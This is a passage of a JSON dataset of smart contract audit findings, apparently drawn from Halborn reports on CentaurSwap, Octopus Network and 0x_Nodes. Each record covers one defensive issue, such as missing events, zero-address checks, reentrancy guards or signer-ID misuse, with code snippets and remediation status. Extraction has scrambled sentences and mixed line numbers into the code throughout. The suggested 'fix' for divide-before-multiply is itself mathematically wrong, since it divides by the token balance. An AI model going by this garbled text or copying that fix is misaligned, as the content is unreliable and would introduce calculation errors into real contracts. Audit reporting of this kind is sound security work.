        "body": "In the CentaurFactoryTimeLock contract, the functions do not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: CentaurFactoryTimeLock.sol Listing 6: Functions (Lines ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function createPool ( address _baseToken , address _oracle , uint _liquidityParameter ) function addPool ( address _pool ) function removePool ( address _pool ) function transferOwnership ( address _owner ) function setPoolTradeEnabled ( address _pool , bool _tradeEnabled ) function setPoolDepositEnabled ( address _pool , bool _depositEnabled ) function setPoolWithdrawEnabled ( address _pool , bool _withdrawEnabled ) function setPoolLiquidityParameter ( address _pool , uint _liquidityParameter ) function setAllPoolsTradeEnabled ( bool _tradeEnabled ) function setAllPoolsDepositEnabled ( bool _depositEnabled ) function setAllPoolsWithdrawEnabled ( bool _withdrawEnabled ) function emergencyWithdrawFromPool ( address _pool , address _token , uint _amount , address _to ) function setRouterOnlyEOAEnabled ( bool _onlyEOAEnabled ) function setRouterContractWhitelist ( address _address , bool _whitelist ) function setSettlementDuration ( uint _duration ) function setPoolFee ( uint _poolFee ) 18 17 18 19 20 function setPoolLogic ( address _poolLogic ) function setCloneFactory ( address _cloneFactory ) function setSettlement ( address _settlement ) function setRouter ( address payable _router ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: PENDING: CentaurSwap Team will add event in a future release of CentaurFactory instead of CentaurFactoryTimeLock contract. 19 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
        "body": "The CentaurFactoryTimeLock.sol contract has lack a safety check inside Setters of address type parameters should constructor and functions. Otherwise, contract functionality may include a zero-address check. become inaccessible, or tokens could be burnt forever. Code Location: CentaurFactoryTimeLock.sol Listing 7: CentaurFactoryTimeLock.sol (Lines ) 35 36 37 38 39 40 41 42 43 44 45 46 47 constructor ( ICentaurFactory _centaurFactory , address _admin , address _normalMaintainer , address _emergencyMaintainer ) public { centaurFactory = _centaurFactory ; _setRoleAdmin ( TIMELOCK_ADMIN_ROLE , TIMELOCK_ADMIN_ROLE ); _setRoleAdmin ( NORMAL_MAINTAINER_ROLE , TIMELOCK_ADMIN_ROLE ) ; _setRoleAdmin ( EMERGENCY_MAINTAINER_ROLE , TIMELOCK_ADMIN_ROLE ); _setupRole ( TIMELOCK_ADMIN_ROLE , _admin ); _setupRole ( NORMAL_MAINTAINER_ROLE , _normalMaintainer ); _setupRole ( EMERGENCY_MAINTAINER_ROLE , _emergencyMaintainer ); PENDING_UNLOCK = false ; } Listing 8: CentaurFactoryTimeLock.sol (Lines ) 35 constructor ( ICentaurFactory _centaurFactory , address _admin , address function createPool ( address _baseToken , address 20 _oracle , uint _liquidityParameter ) function addPool ( address _pool ) function removePool ( address _pool ) function transferOwnership ( address _owner ) function setPoolTradeEnabled ( address _pool , bool _tradeEnabled ) function setPoolDepositEnabled ( address _pool , bool _depositEnabled ) function setPoolWithdrawEnabled ( address _pool , bool _withdrawEnabled ) function setPoolLiquidityParameter ( address _pool , uint _liquidityParameter ) function emergencyWithdrawFromPool ( address _pool , address _token , uint _amount , address _to ) function setRouterContractWhitelist ( address _address , bool _whitelist ) function setPoolLogic ( address _poolLogic ) function setCloneFactory ( address _cloneFactory ) function setSettlement ( address _settlement ) function setRouter ( address payable _router ) 36 37 38 39 40 41 42 43 44 45 46 47 48 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: Listing 9: Modifier.sol (Lines 2,3,4) 1 2 3 4 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; 21 5 } Remediation Plan: SOLVED: CentaurSwap Team added Zero-Address check. 22 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF DELAY DEFINITION ON THE CRITICAL FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
        "body": "In the CentaurFactoryTimeLock contracts, the some of the functions do not have timelock. The timelock is a fixed delay time that allows for some reaction time in the event of an unexpected change that is not agreed upon or malicious, and therefore it is possible to unlock the funds and secure them. Code Location: CentaurFactoryTimeLock.sol Listing 10: Functions (Lines ) 1 2 3 4 5 6 7 8 9 10 11 function setPoolFee ( uint _poolFee ) external onlyRole ( NORMAL_MAINTAINER_ROLE ) { centaurFactory . setPoolFee ( _poolFee ); } function setPoolLogic ( address _poolLogic ) external onlyRole ( NORMAL_MAINTAINER_ROLE ) { centaurFactory . setPoolLogic ( _poolLogic ); } function setPoolLiquidityParameter ( address _pool , uint _liquidityParameter ) public onlyRole ( NORMAL_MAINTAINER_ROLE ) { centaurFactory . setPoolLiquidityParameter ( _pool , _liquidityParameter ); } 23 Risk Level: Likelihood - 1 Impact - 1 Recommendation: The timelock should be stated on the critical changes. Whenever the timelock is set by the functions, no one can reduce the waiting time unless using a governance system or an emergency role. Remediation Plan: ACKNOWLEDGED: CentaurSwap Team claims that this is intended. Timelock is only in place for emergency withdrawal. The rest of the functions are governed by Multisig confirmations. 24 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING CONSTANT DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
        "body": "State variables should be declared constant to save gas. Without constant definition, the state variable reading progress is performed through the SLOAD operation which costs 200 gas alone. Code Location: CentaurFactoryTimeLock.sol Line #21 Listing 11: CentaurFactoryTimeLock.sol (Lines 21) 21 uint public TIMELOCK_PERIOD = 1 days ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add the constant attributes to state variables that never change. Remediation Plan: SOLVED: CentaurSwap Team solved in HAL-03 remediation plan. 25 3.8 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Informational"
        ]
    },
    {
        "title": "ANYONE CAN CHANGE OCT TOKEN ACCOUNT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the change_oct_token is lacking the ownership check, which allows anyone to change the OCT token account. Code Location: Listing 1: appchain-registry/src/sudo_actions.rs (Lines 19) // fn change_oct_token (& mut self , oct_token : AccountId ) { 17 impl SudoActions for AppchainRegistry { 18 19 20 21 22 self . oct_token = oct_token ; } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to add self.assert_owner(); to prevent anyone from changing the OCT token account. Remediation Plan: SOLVED: The Octopus Network team solved this issue by removing this function. 16 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Critical"
        ]
    },
    {
        "title": "SMART CONTRACT MAIN FUNCTIONALITY DoS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the project is vulnerable to DoS of the main func- tionality. In NEAR, there is a validation that tells whether the account format is valid or not. During conclude_voting_score, the new sub_account is created by appending the appchain_id to the registry account: Listing 2: appchain-registry/src/registry_owner_actions.rs (Lines 187) self . assert_owner () ; assert! ( 180 fn conclude_voting_score (& mut self ) { 181 182 183 184 185 186 !self . top_appchain_id_in_queue . is_empty () , \" There is no appchain on the top of queue yet .\" ); // Set the appchain with the largest voting score to go ` 187 188 189 190 191 staging ` let sub_account_id = format! ( \" {}.{} \" , & self . top_appchain_id_in_queue , env :: current_account_id () ); Then, at the end, smart contracts creates a new create_account promise action to create new sub account: Listing 3: appchain-registry/src/registry_owner_actions.rs (Lines 215) 214 215 216 217 218 Promise :: new ( sub_account_id ) . create_account () . transfer ( APPCHAIN_ANCHOR_INIT_BALANCE ) . add_full_access_key ( self . owner_pk . clone () ); } The issue is that no check ensures that the appchain_id complies with Therefore, if invalid appchain_id became NEARs validation rules. 17 top_appchain_id_in_queue and used during the creation of sub_account, the smart contract will inevitably panic during the creation of the account. Since there is no functionality to remove top_appchain_id_in_queue, the The smart contract will smart contract wont conclude votes anymore. get stuck it at that appchain_id. Code Location: Listing 4: appchain-registry/src/registry_owner_actions.rs (Lines 215) 214 215 216 217 218 Promise :: new ( sub_account_id ) . create_account () . transfer ( APPCHAIN_ANCHOR_INIT_BALANCE ) . add_full_access_key ( self . owner_pk . clone () ); } Risk Level: Likelihood - 5 Impact - 5 Recommendation: Even though the Octopus Network team reviews appchains and their regis- tration data manually to avoid that, the issue is critical from the smart contract perspective. It is always better to be safe from human error. Therefore, please add account validation during the appchain registration phase to avoid this issue. You can utilize is_top_level_account_id and is_sub_account_of functions within the nearcore. Remediation Plan: SOLVED: The Octopus Network team solved the issue by using ValidAccountId helper class. 18 Fixed Code: Listing 5: appchain-registry/src/lib.rs (Lines 329,330,331) 325 326 327 328 329 330 331 332 333 334 assert! ( !appchain_id . trim () . is_empty () , \" Missing necessary field ' appchain_id '. \" ); assert! ( appchain_id . find (\" . \"). is_none () , \" Invalid ' appchain_id '. \"); assert! ( ValidAccountId :: try_from ( format! ( \" {}.{} \" , appchain_id , env :: current_account_id () )) . is_ok () , \" Invalid ' appchain_id '. \" ); 19 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Critical"
        ]
    },
    {
        "title": "IMPROPER ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that most of the privileged functionality is controlled by the owner. Additional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or information. The ownership role is helpful in a simple system, but more complex projects require more roles by using role-based access control. Code Location: The owner can access those functions:  All functions in sudo_actions.rs  All functions in registry_settings_actions.rs  All functions in registry_owner_actions.rs except count_voting_score  set_owner in lib.rs Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to add additional roles to comply with the least privilege principle and limit the privileges of owner. 20 Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding role based access control functionality.. 21 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: High"
        ]
    },
    {
        "title": "REGISTRY OWNER CAN SET ITSELF AS VOTER OPERATOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the owner could set itself as a voter_operator. This functionality violates the principle of least privilege giving the owner additional privileges. Code Location: Listing 6: 57) appchain-registry/src/registry_settings_actions.rs (Lines fn change_operator_of_counting_voting_score (& mut self , operator_account : AccountId ) { self . assert_owner () ; let mut registry_settings = self . registry_settings . get () . unwrap () ; registry_settings . operator_of_counting_voting_score . clear () ; registry_settings . operator_of_counting_voting_score . push_str (& operator_account ); self . registry_settings . set (& registry_settings ); } 57 58 59 60 61 62 63 64 65 66 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to add another check to do not allow the owner to set itself as a voter operator. 22 Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding relevant check. Fixed Code: Listing 7: 61) appchain-registry/src/registry_settings_actions.rs (Lines 57 58 59 60 61 62 63 64 65 66 67 68 69 70 fn change_operator_of_counting_voting_score (& mut self , operator_account : AccountId ) { self . assert_owner () ; assert_ne! ( operator_account , self . owner , \" The account should NOT be the owner . \" ); let mut registry_settings = self . registry_settings . get () . unwrap () ; assert_ne! ( operator_account , registry_settings . operator_of_counting_voting_score , \" The account is not changed . \" ); registry_settings . operator_of_counting_voting_score = operator_account ; self . registry_settings . set (& registry_settings ); } 23 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "REGISTRY OWNER CAN BE SET AS APPCHAIN OWNER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the owner could be set as an appchain_owner. This functionality violates the principle of least privilege giving the owner additional privileges. Code Location: appchain-registry/src/lib.rs: register_appchain - sender_id should not be equal to the registry owner appchain-registry/src/appchain_owner_actions.rs: transfer_appchain_ownership - new_owner should not be equal to the registry owner Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add an additional check to do not allow the owner to set itself as an voter operator. Remediation Plan: PARTIALLY SOLVED: The Octopus Network team partially solved the issue by adding the required check only to appchain-registry/src/lib.rs. Fixed Code: 24 appchain-registry/src/lib.rs Listing 8: appchain-registry/src/lib.rs (Lines 308,309,310) 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 fn register_appchain ( & mut self , sender_id : AccountId , appchain_id : AppchainId , register_deposit : Balance , website_url : String , function_spec_url : String , github_address : String , github_release : String , contact_email : String , premined_wrapped_appchain_token_beneficiary : AccountId , premined_wrapped_appchain_token : U128 , ido_amount_of_wrapped_appchain_token : U128 , initial_era_reward : U128 , fungible_token_metadata : FungibleTokenMetadata , custom_metadata : HashMap < String , String >, ) { assert_ne! ( sender_id , self . owner , \" The register account should NOT be the contract owner . \" ); 25 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "USAGE OF SIGNER ACCOUNT ID INSTEAD OF PREDECESSOR ID IN ACCESS CONTROL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the env::signer_account_id() was used in the assert_appchain_owner to assert whether the caller is the appchain_owner.  env::signer_account_id(): The id of the account that either signed the original transaction or issued the initial cross-contract call.  env::predecessor_account_id(): The id of the account that was the previous contract in the chain of cross-contract calls. If this is the first contract, it is equal to signer_account_id. From their definitions above, we can derive that the usage of env:: signer_account_id() is risky in access control scenarios. There is a risk that the appchain owner can be phished to sign the cross contract call and hence unknowingly let the malicious contract execute functions in the projects contract under that owners role. Code Location: Listing 9: appchain-registry/src/lib.rs (Lines 178) 175 fn assert_appchain_owner (& self , appchain_id : & AppchainId ) { let appchain_basedata = self . get_appchain_basedata ( 176 177 178 179 180 181 182 appchain_id ); assert_eq! ( env :: signer_account_id () , appchain_basedata . owner () . clone () , \" Function can only be called by appchain owner . \" ); } 26 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider replacing env::signer_account_id() with env::predecessor_account_id () to avoid that risk. Remediation Plan: SOLVED: The Octopus Network team solved the issue by changing env:: signer_account_id() to env::predecessor_account_id(). Fixed Code: Listing 10: appchain-registry/src/lib.rs (Lines 178) 175 fn assert_appchain_owner (& self , appchain_id : & AppchainId ) { let appchain_basedata = self . get_appchain_basedata ( 176 177 178 179 180 181 182 appchain_id ); assert_eq! ( env :: predecessor_account_id () , appchain_basedata . owner () . clone () , \" Function can only be called by appchain owner . \" ); } 27 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "APPCHAIN CAN BE REGISTERED WITHOUT CORE DETAILS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that it is possible to register an appchain without providing any core details such as appchain_id, website_url, and so on. Those details are needed for intended functionality of the application. Code Location: Existence of those fields has to be enforced: appchain-registry/src/lib.rs: register_appchain  appchain_id  website_url  function_spec_url  github_address  github_release  contact_email  premined_wrapped_appchain_token_beneficiary  fungible_token_metadata.name  fungible_token_metadata.symbol Risk Level: Likelihood - 4 Impact - 3 Recommendation: It is recommended to add additional checks to enforces those fields. 28 Remediation Plan: SOLVED: The Octopus Network team solved the issue by enforcing required fields. Fixed Code: Listing 11: appchain-registry/src/lib.rs 334 assert! ( 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 !appchain_id . trim () . is_empty () , \" Missing necessary field ' appchain_id '. \" ); assert! ( !website_url . trim () . is_empty () , \" Missing necessary field ' website_url '. \" ); assert! ( !function_spec_url . trim () . is_empty () , \" Missing necessary field ' function_spec_url '. \" ); assert! ( !github_address . trim () . is_empty () , \" Missing necessary field ' github_address '. \" ); assert! ( !github_release . trim () . is_empty () , \" Missing necessary field ' github_release '. \" ); assert! ( !contact_email . trim () . is_empty () , \" Missing necessary field ' contact_email '. \" ); assert! ( !premined_wrapped_appchain_token_beneficiary . trim () . is_empty () , \" Missing necessary field ' premined_wrapped_appchain_token_beneficiary '. \" ); fungible_token_metadata . assert_valid () ; assert! ( !fungible_token_metadata . name . trim () . is_empty () , \" Missing necessary field ' fungible token name '. \" 29 368 369 370 371 372 ); assert! ( !fungible_token_metadata . symbol . trim () . is_empty () , \" Missing necessary field ' fungible token symbol '. \" ); 30 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING CARGO OVERFLOW CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that there is no overflow-checks=true in Cargo.toml. By default, overflow checks are disabled in optimized release builds. Hence, if there is an overflow in release builds, it will be silenced, leading to unexpected behavior of an application. Even if checked arithmetic is used through checked_*, it is recommended to have that check in Cargo.toml. Code Location:  Cargo.toml Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to add overflow-checks=true under your release profile in Cargo.toml. Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding overflow- checks=true. 31 ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF PAUSABILITY OF SMART CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It is advised that in The project lacks ability to pause contracts. case of unexpected events temporarily disable some important functions to prevent further damage. Risk Level: Likelihood - 1 Impact - 4 Recommendation: Consider implementing the pause feature in the smart contracts. Further- more, it is recommended to add a separate role for being responsible for pausing smart contracts when needed. Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding the paus- ability to smart contracts. 32 3.10 (HAL-10) USAGE OF VULNERABLE CRATES - LOW ",
        "labels": [
            "Halborn",
            "Octopus_Network_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER APPLICATION OF PRINCIPLE OF LEAST PRIVILEGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In Kernel.sol during initialization, _owner is assigned to both OWNER_ROLE and MANAGER_ROLE, which violates the principle of least privilege. Also, setting the OWNER_ROLE as role admin for MANAGER_ROLE through _setRoleAdmin(MANAGER_ROLE, OWNER_ROLE); has no benefits. Code Location: Listing 1: Kernel.sol (Lines 135,138,141) ) external initializer { __ModuleMapConsumer_init ( moduleMap_ ); __AccessControl_init () ; address admin_ , address owner_ , address moduleMap_ 123 function initialize ( 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 } // make the \" admin_ \" address the default admin role _setupRole ( DEFAULT_ADMIN_ROLE , admin_ ); // make the \" owner_ \" address the owner of the system _setupRole ( OWNER_ROLE , owner_ ); // give the \" owner_ \" address the manager role , too _setupRole ( MANAGER_ROLE , owner_ ); // owners are admins of managers _setRoleAdmin ( MANAGER_ROLE , OWNER_ROLE ); initializationTimestamp = block . timestamp ; 17 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to have different addresses assigned to both OWNER_ROLE and MANAGER_ROLE and update deployment scripts to reflect changes. Remediation Plan: RISK ACCEPTED: 0x_nodes accepts the risk and they will fix the issue in a future release. 18 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit OpenZeppelin has its own mutex the function with a recursive call. implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: There are many functions within the project that are missing nonReentrant modifier. Kernel.sol - deposit - withdraw - claimEthRewards - claimBiosRewards - claimAllRewards - enterStrategy - exitStrategy Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. 19 Remediation Plan: SOLVED: 0x_nodes team added the nonReentrant modifier to all required functions. 20 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF PAUSE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It is advised that in The project lacks ability to pause contracts. case of unexpected events temporarily disable some important functions to prevent further damage. Risk Level: Likelihood - 1 Impact - 4 Remediation: Consider implementing the pause feature in the smart contracts. It can be achieved by using OpenZepplins PausableUpgradeable contracts. Also, it is recommended to add a separate role for being responsible for pausing smart contracts when needed. References:  https://github.com/OpenZeppelin/openzeppelin-contracts- upgradeable/blob/master/contracts/security/PausableUpgradeable.sol Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 21 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Low"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In SushiSwapIntegration.sol, there are two instances of multiplication per- formed on the result of division. Code Location: Listing 2: SushiSwapIntegration.sol (Lines 134,135) 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 function getPoolEthValue ( uint256 poolid ) public view returns ( uint256 poolETHValue ) { address token0 = pools [ poolid ]. tokenPair . token0 ; address token1 = pools [ poolid ]. tokenPair . token1 ; uint256 lpAmount = pools [ poolid ]. poolInfo . lpToken . balanceOf ( address ( this )) + ISushiSwapMasterChef ( masterChef ). userInfo ( poolid , address ( this )) . amount ; uint256 sharePercent = ( lpAmount * 10000000000 / pools [ poolid ]. poolInfo . lpToken . totalSupply () ); if ( sharePercent == 0) { return 0; } uint256 token0Amount = sharePercent / 2 * IERC20 ( token0 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) / 10000000000; uint256 token1Amount = sharePercent / 2 * IERC20 ( token1 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) / 10000000000; return wethAddress == address ( token0 ) ? token0Amount + getAmountOut ( token1 , token0 , token1Amount ) : token1Amount + getAmountOut ( token0 , token1 , 22 140 } token0Amount ); Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non-floating data type. The sample solution is shared in the code snippet below. Listing 3: SushiSwapIntegration.sol (Lines 134,135) function getPoolEthValue ( uint256 poolid ) public view returns ( uint256 poolETHValue ) { address token0 = pools [ poolid ]. tokenPair . token0 ; address token1 = pools [ poolid ]. tokenPair . token1 ; uint256 lpAmount = pools [ poolid ]. poolInfo . lpToken . balanceOf ( address ( this )) + ISushiSwapMasterChef ( masterChef ). userInfo ( poolid , address ( this )) . amount ; uint256 sharePercent = ( lpAmount * 10000000000 / pools [ poolid ]. poolInfo . lpToken . totalSupply () ); if ( sharePercent == 0) { return 0; } uint256 token0Amount = sharePercent / (2 * IERC20 ( token0 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) ) / 10000000000; uint256 token1Amount = sharePercent / (2 * IERC20 ( token1 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) ) / 10000000000; 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 23 139 return wethAddress == address ( token0 ) ? token0Amount + getAmountOut ( token1 , token0 , token1Amount ) : token1Amount + getAmountOut ( token0 , token1 , token0Amount ); 140 } Remediation Plan: SOLVED: 0x_nodes team fixed the code to perform multiplication first. 24 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are many instances of block.timestamp usage within the project. block.timestamp can be influenced by miners to a certain degree, so developers should be aware that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: Listing 4: Kernel.sol (Lines 143) ) external initializer { __ModuleMapConsumer_init ( moduleMap_ ); __AccessControl_init () ; address admin_ , address owner_ , address moduleMap_ 123 function initialize ( 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 } // make the \" admin_ \" address the default admin role _setupRole ( DEFAULT_ADMIN_ROLE , admin_ ); // make the \" owner_ \" address the owner of the system _setupRole ( OWNER_ROLE , owner_ ); // give the \" owner_ \" address the manager role , too _setupRole ( MANAGER_ROLE , owner_ ); // owners are admins of managers _setRoleAdmin ( MANAGER_ROLE , OWNER_ROLE ); initializationTimestamp = block . timestamp ; 25 Listing 5: Kernel.sol (Lines 561) 559 function deploy () external onlyGasAccount { 560 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ). deploy () ; lastDeployTimestamp = block . timestamp ; emit Deploy () ; 561 562 563 } Listing 6: Kernel.sol (Lines 569) 566 function harvestYield () external onlyGasAccount { 567 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . harvestYield () ; lastHarvestYieldTimestamp = block . timestamp ; emit HarvestYield () ; 568 569 570 571 } Listing 7: Kernel.sol (Lines 577) 574 function processYield () external onlyGasAccount { 575 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . processYield () ; lastProcessYieldTimestamp = block . timestamp ; emit ProcessYield () ; 576 577 578 579 } 26 Listing 8: Kernel.sol (Lines 586) 582 function distributeEth () external onlyGasAccount { 583 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . distributeEth () ; lastLastDistributeEthTimestamp = lastDistributeEthTimestamp ; lastDistributeEthTimestamp = block . timestamp ; emit DistributeEth () ; 584 585 586 587 588 } Listing 9: Kernel.sol (Lines 594) 591 function biosBuyBack () external onlyGasAccount { 592 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . biosBuyBack () ; lastBiosBuyBackTimestamp = block . timestamp ; emit BiosBuyBack () ; 593 594 595 596 } 27 Listing 10: BiosRewards.sol (Lines 55,58,62,63) 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 function notifyRewardAmount ( address token , uint256 reward , uint32 duration ) external override onlyController updateReward ( token , address (0) ) { if ( block . timestamp >= periodFinish [ token ]) { rewardRate [ token ] = reward / duration ; } else { uint256 remaining = periodFinish [ token ] - block . timestamp ; uint256 leftover = remaining * rewardRate [ token ]; rewardRate [ token ] = ( reward + leftover ) / duration ; } lastUpdateTime [ token ] = block . timestamp ; periodFinish [ token ] = block . timestamp + duration ; totalBiosRewards += reward ; emit RewardAdded ( token , reward , duration ); } Listing 11: BiosRewards.sol (Lines 107) 101 102 103 104 105 106 107 108 function lastTimeRewardApplicable ( address token ) public view override returns ( uint256 ) { } return MathUpgradeable . min ( block . timestamp , periodFinish [ token ]) ; 28 Listing 12: SushiSwapTrader.sol (Lines 140) 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 function swapExactInput ( address tokenIn , address tokenOut , address recipient , uint256 amountIn , uint256 amountOutMin ) public override onlyController returns ( bool ) { require ( IERC20MetadataUpgradeable ( tokenIn ). balanceOf ( address ( this )) >= amountIn , \" SushiSwapTrader :: swapExactInput : Balance is less than trade amount \" ); address [] memory path = new address [](2) ; path [0] = tokenIn ; path [1] = tokenOut ; uint256 deadline = block . timestamp ; ... }  Also, anywhere deadline is used. 29 Listing 13: UniswapTrader.sol (Lines 306,343) 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 function swapExactInput ( address tokenIn , address tokenOut , address recipient , uint256 amountIn ) external override onlyController returns ( bool tradeSuccess ) { IERC20MetadataUpgradeable tokenInErc20 = 